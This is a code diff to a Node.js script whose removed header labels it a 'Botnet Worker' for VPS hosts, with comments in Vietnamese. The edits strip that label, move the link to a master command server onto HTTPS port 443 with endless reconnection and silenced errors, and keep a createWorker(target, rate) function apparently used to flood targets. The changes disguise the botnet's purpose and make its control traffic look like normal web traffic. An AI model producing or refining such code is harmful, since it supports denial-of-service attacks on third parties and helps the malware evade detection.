@@ -1,7 +1,3 @@
-// worker.js - Botnet Worker
-// Chạy trên VPS worker
-// node worker.js <master_ip>
-
 process.on('uncaughtException', (err) => {});
 process.on('unhandledRejection', (err) => {});
 
@@ -17,7 +13,7 @@ const os = require('os');
 
 // ==================== CONFIG ====================
 const MASTER_IP = process.argv[2];
-const MASTER_PORT = 10000; // Cổng mặc định của master
+const MASTER_PORT = 443;
 
 if (!MASTER_IP) {
     console.error('[!] Usage: node worker.js <master_ip>');
@@ -264,15 +260,15 @@ function createWorker(target, rate) {
 }
 
 // ==================== KẾT NỐI TỚI MASTER ====================
-const masterUrl = `http://${MASTER_IP}:${MASTER_PORT}`;
+const masterUrl = `https://${MASTER_IP}`; // Bỏ port, dùng HTTPS
 console.log(`[+] Connecting to master at ${masterUrl}`);
 
 const socket = io(masterUrl, {
     reconnection: true,
     reconnectionAttempts: Infinity,
     reconnectionDelay: 1000,
-    reconnectionDelayMax: 5000,
-    timeout: 10000
+    timeout: 10000,
+    transports: ['websocket', 'polling']
 });
 
 socket.on('connect', () => {
